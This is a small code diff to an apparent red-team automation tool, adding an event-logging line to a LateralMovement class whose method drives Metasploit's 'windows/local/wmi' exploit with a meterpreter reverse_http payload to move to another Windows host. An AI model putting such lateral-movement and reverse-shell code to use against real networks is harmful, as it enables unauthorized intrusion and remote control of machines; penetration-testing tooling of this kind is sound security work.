@@ -1,7 +1,4 @@
-
-
-
-
+from data.event import EventUtils
 
 class LateralMovement():
     
@@ -11,6 +8,7 @@ class LateralMovement():
         self.msfclient = msfclient
 
     def lmove(self, sessionInput):
+        EventUtils.settingEvent(self, "Using WMI to move to a different client...")
         lmove_exploit = ['windows/local/wmi']
         exploit = self.msfclient.modules.use('exploit', lmove_exploit[0])
         _payload = self.msfclient.modules.use('payload', 'windows/x64/meterpreter/reverse_http')
